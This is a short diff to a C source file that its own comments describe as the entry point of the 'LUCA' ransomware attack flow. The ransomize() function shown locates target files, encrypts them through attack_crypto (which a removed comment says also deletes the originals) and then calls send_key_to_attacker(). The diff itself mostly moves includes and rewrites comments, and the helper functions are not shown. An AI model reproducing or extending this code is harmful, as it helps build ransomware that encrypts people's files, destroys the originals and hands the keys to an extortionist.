@@ -1,14 +1,16 @@
+/*  This file contains the code for the LUCA attack flow. It is the entry point for the ransomization. */
+#include <stdio.h>
+#include <stdlib.h>
+
 #include "attack.h"
 #include "attack_crypto.h"
 #include "get_relative_path.h"
 #include "attack_web.h"
 #include "read_files.h"
-#include <stdio.h>
-#include <stdlib.h>
 
-int ransomize(void)
-{
-    /* Target files, save paths in an array */
+/* Attack entry point */
+int ransomize(void) {
+    // Target files, save paths in an array
     size_t count = 0;
     char **paths = find_paths(&count);
 
@@ -34,18 +36,13 @@ int ransomize(void)
         return 1;
     }
 
-    /* Generate key, encrypt files and key */
+    // Generate key, encrypt files and key 
     attack_crypto(important);
     
     crypto_cleanup();
 
-    /* Delete original files */
-    // In attack_crypto
-
-    /* Handle remote actions */
+    // Send victim information to the attacker
     send_key_to_attacker();
-
-    /* Cleanup */
 
     return 0;
 }
